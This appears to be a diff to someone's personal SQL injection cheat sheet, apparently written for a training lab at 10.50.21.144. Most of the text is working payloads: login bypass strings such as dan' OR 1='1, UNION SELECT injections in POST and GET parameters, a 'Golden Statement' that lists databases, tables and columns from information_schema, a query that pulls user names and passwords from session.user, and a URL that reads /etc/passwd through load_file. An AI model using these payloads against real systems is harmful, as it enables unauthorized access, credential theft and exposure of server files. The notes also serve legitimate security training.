@@ -156,6 +156,7 @@ SELECT <column> FROM <db>.<tbl> WHERE <condition>		# use 'WHERE' to add a condit
 	IN (…)								Number exists in a list																col_name IN (2, 4, 6)
 	NOT IN (…)						Number does not exist in a list												col_name NOT IN (1, 3, 5)
 https://sqlbolt.com/lesson/select_queries_with_constraints		# more info here
+... where table_schema='session'		# or whatever db is relevent
 
 ## unsanitized POST fields
 enter password: dan' OR 1='1		# passes a TRUE bool through the password check system
@@ -173,19 +174,34 @@ Audi' UNION select 1,2,3,4;
 Audi' UNION select 1,2,3,4; #
 Audi' UNION select 1,2,3,4; --
 Audi' UNION select 1,2,3,4,5; #		# command that works, in this example there are 5 columns and column 2 is hidden
-# Golden Statement: select table_schema,table_name,column_name from information_schema.columns
-Audi' Union select table_schema,2,table_name,column_name,5 from information_schema.columns; #
-# 2 is inserted bc its hidden & 5 is tacked on to mach the requied num of fields
-select id,2,name,pass,5 from session.user
 
+# Golden Statement: select table_schema,table_name,column_name from information_schema.columns
+# table_schema = list of Databases | table_name = list of tables | column_name = list of columns
+
+Audi' Union select table_schema,2,table_name,column_name,5 from information_schema.columns; #
+# 2 is inserted bc its hidden & 5 is tacked on to fill in the requied num of fields
+# from this list find database, tabels and columns of interest and pull them:
+Audi' UNION select id,2,name,pass,5 from session.user; #
 
 ## unsanitized GET fields
 # must have .php, look under "network" > "Request" for username & pword variable names
 http://10.50.21.144/login.php?usrNameVar=dan' or 1='1&pwordVar=dan' or 1='1		# get request using TRUE bool
 
+# same as POST, find an unsanitized field, '' are not always needed
+http://10.50.21.144/uniondemo.php?Selection=1&Submit=Submit		# normal url
+http://10.50.21.144/uniondemo.php?Selection=1 or 1=1&Submit=Submit		# injected url, try all selections (1;|1; #|1; --)
+# start fuzzing from lowest num, columns in this case
+	Rows: 5
+	Columns: 3
+http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3&Submit=Submit		# inserted ' UNION select 1,2,3 ' and nums until it works
+# determine the amount of columns (3 in this example) and hidden columns (none in this example)
+# use Golden Statement again: select table_schema,table_name,column_name from information_schema.columns
+http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns&Submit=Submit
+# don't get lost in the sause ;)
 
-
-
+# can load files with SQL with: load_file('/etc/passwd')
+http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,load_file('/etc/passwd')&Submit=Submit
+# @@version can be used the same way to get SQL version number
 
 
 
